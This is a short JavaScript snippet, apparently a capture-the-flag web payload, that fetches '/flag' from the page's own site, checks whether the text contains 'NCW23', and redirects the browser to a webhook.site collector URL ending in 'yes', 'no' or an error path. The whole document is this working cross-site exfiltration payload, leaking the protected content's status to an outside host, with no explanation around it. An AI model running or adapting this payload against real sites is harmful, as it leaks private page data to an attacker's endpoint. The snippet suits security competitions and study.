fetch('/flag').then((res) => {
    res.text().then((test) => {
        if (test.match(/NCW23/)) {
            window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/yes`;
        } else {
            window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/no`;
        }
    }).catch((owo) => {
        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error2`;
    })
}).catch((owo) => {
    window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error`;
})